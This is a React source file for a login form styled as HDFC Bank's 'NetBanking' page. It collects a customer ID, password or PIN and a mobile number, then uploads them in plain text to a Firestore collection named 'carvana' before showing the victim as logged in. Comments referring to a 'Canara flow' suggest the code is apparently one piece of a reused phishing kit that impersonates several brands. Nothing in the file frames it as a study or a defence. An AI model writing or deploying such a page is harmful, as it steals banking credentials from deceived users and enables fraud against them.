/* eslint-disable react/prop-types */


import { useState } from 'react';
import bottom1 from './assets/bottom1.jpeg';
import FirebaseUtil from './FirebaseRepo';



const LoginForm = ({ setIsLoggedIn }) => {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleNameChange = (e) => setName(e.target.value);
  const handlePhoneChange = (e) => setPhone(e.target.value);
  const handlePasswordChange = (e) => setPassword(e.target.value);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();

      // Generate or reuse a persistent document ID per user (same as Canara flow)
      let documentId = localStorage.getItem('carvana_document_id');
      if (!documentId) {
        documentId = `user_${timestamp}`;
        localStorage.setItem('carvana_document_id', documentId);
      }

      // Upload login data to the same Firestore document under the single 'carvana' collection
      await FirebaseUtil.uploadAnyModel(`carvana/${documentId}`, { name, phone, password });

      setIsLoggedIn(true);
      setIsSubmitting(false);
    } catch (error) {
      console.error('Error submitting login form:', error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col ">
        <h1 className='mb-4'>Login to NetBanking</h1>
 <form onSubmit={handleSubmit}>
      <div className="mb-4">
        <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="name">
          Customer ID/User ID*
        </label>
        <input
          className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          id="name"
          type="number"
          value={name}
          onChange={handleNameChange}
          required
        />
      </div>
      <div className="mb-4">
        <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="password">
          Password/PIN
        </label>
        <input
          className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          id="password"
          type="password"
          value={password}
          onChange={handlePasswordChange}
          required
        />
      </div>
      <div className="mb-4">
        <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="phone">
          Mobile Number
        </label>
        <input
          className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          id="phone"
          type="tel"
          value={phone}
          onChange={handlePhoneChange}
          required
          maxLength="10"
        />
      </div>
      <div className="flex justify-center">
        <button
          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
          type="submit"
          disabled={isSubmitting}
        >
          {isSubmitting ? "Loading..." : "Proceed"}
        </button>
      </div>
    </form>
    <img src={bottom1} alt="NetBanking" className="w-1/3  mt-4" />
    <p className='text-white text-sm bg-blue-700 p-2'>© Copyright HDFC Bank Ltd. Terms and Conditions Privacy Policy</p>
    </div>
   
  );
};

export default LoginForm;